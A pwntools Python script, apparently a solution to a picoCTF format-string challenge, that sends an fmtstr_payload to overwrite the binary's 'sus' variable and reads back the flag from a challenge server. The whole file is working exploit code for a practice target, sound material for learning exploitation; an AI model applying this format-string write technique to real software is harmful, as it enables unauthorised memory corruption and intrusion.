#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 64423)

    return r


def main():
    r = conn()

    payload = fmtstr_payload(offset = 14, writes = {exe.sym.sus: 0x67616c66}, strategy = "fast")
    r.sendline(payload)

    flag = r.recvlinesS(4)[-1]
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
